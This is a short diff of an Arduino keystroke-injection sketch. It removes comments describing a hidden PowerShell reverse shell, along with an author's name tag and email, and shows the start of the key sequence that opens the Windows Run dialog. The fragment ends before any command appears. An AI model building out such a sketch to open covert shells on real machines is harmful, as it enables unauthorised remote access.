@@ -1,8 +1,4 @@
 void setup() {
-  // reverse_shell with powershell(hidden)
-  // edit by xy 16.01.24
-  // mail:i@cdxy.me
-  
   delay(2000);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
